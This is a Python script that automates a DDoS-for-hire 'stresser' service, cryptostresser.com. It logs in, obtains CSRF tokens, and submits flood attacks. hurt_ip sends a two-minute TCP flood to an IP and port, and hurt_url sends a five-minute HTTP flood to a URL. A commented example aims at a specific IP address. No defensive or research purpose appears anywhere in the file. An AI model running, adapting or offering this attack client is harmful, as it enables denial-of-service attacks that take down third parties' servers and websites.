# @time     : 2022-07-11 13:24:35
# @File     : cryptostresser.py
# @Author   : Twoyear
# @url      : https://cryptostresser.com/
import requests
import json
import datetime


class Cryptostresser:
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.requs = requests.session()
        self.requs.headers = {
            'authority': 'cryptostresser.com',
            'accept': 'text/plain, */*; q=0.01',
            'accept-language': 'zh-CN,zh;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': 'https://cryptostresser.com/attack?page=1',
            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        self.get_home()
        self.login()

    def get_home(self):
        self.requs.get("https://cryptostresser.com/")

    def get_scrf(self):
        '''
        获取scrf
        :return:
        '''
        url = "https://cryptostresser.com/backend/ajax/csrf"
        scrf = self.requs.get(url).text
        return scrf

    def login(self):
        '''
        登录
        :return:
        '''
        self.get_scrf()
        url = "https://cryptostresser.com/backend/ajax/user"
        payload = json.dumps({
            "action": "login",
            "username": self.username,
            "password": self.password,
            "token": self.get_scrf()
        })
        self.requs.post(url, data=payload)

    def hurt_ip(self, dizhi="", port=0):
        '''
        IP_Hurt
        :return:
        '''
        url = "https://cryptostresser.com/backend/ajax/attack"
        payload = json.dumps({
            "token": self.get_scrf(),
            "action": "send",
            "attack_target": str(dizhi),
            "attack_time": "120",
            "attack_port": str(port),
            "attack_method": "FREETCP",
            "simultaneous_attacks": "1",
            "request_method": "GET",
            "post_data": "",
            "ratelimit": "0",
            "user_agent": "all",
            "custom_ua": "",
            "attack_origin": None,
            "response_size": "all",
            "cookies": "",
            "referrer": "",
            "source_ip": "",
            "host_header": ""
        })

        hurt = self.requs.post(url, data=payload)
        return hurt.text

    def hurt_url(self, url=""):
        '''
        Url_Hurt
        :return:
        '''
        payload = json.dumps({
            "token": self.get_scrf(),
            "action": "send",
            "attack_target": url,
            "attack_time": "300",
            "attack_method": "FREESPAM",
            "simultaneous_attacks": "1",
            "request_method": "GET",
            "post_data": "",
            "ratelimit": "0",
            "user_agent": "all",
            "custom_ua": "",
            "attack_origin": "null",
            "response_size": "all",
            "cookies": "",
            "referrer": "",
            "source_ip": "",
            "host_header": ""
        })
        url = "https://cryptostresser.com/backend/ajax/attack"
        hurt = self.requs.post(url, data=payload)
        return hurt.text


def hurt_main(type, host, port, user_info):
    '''
    主函数
    :param type:
    :param host:
    :param port:
    :return:
    '''
    try:
        cs = Cryptostresser(user_info["username"], user_info["password"])
        if type == "ip":
            result_text = cs.hurt_ip(host, port)
        elif type == "url":
            result_text = cs.hurt_url(host)
        else:
            return {"status": "error", "msg": "type error，参数错误", "code": 400}
        if "Successfully started (1) attacks" in str(result_text):
            return {"status": "success", "msg": "hurt true", "code": 200}
        elif "No network space available for this attack" in str(result_text):
            return {"status": "false", "msg": "没有可用空间，请稍等，本次跳过", "code": 401}
        elif "You cant have any more simultaneous attacks" in str(result_text):
            return {"status": "false", "msg": "请求中，请稍等", "code": 402}
        else:
            msg = "其他未知信息"+ str(result_text)
            return {"status": "false", "msg": msg, "code": 404}
    except Exception as e:
        return {"status": "error", "msg": str(e), "code": 404}


if __name__ == '__main__':
    print(datetime.datetime.now())
    # Crypto = Cryptostresser()
    # # task = Crypto.hurt_ip("180.101.72.18",88)
    # task = Crypto.hurt_url("http://180.101.72.18:88/")
    # print(task)
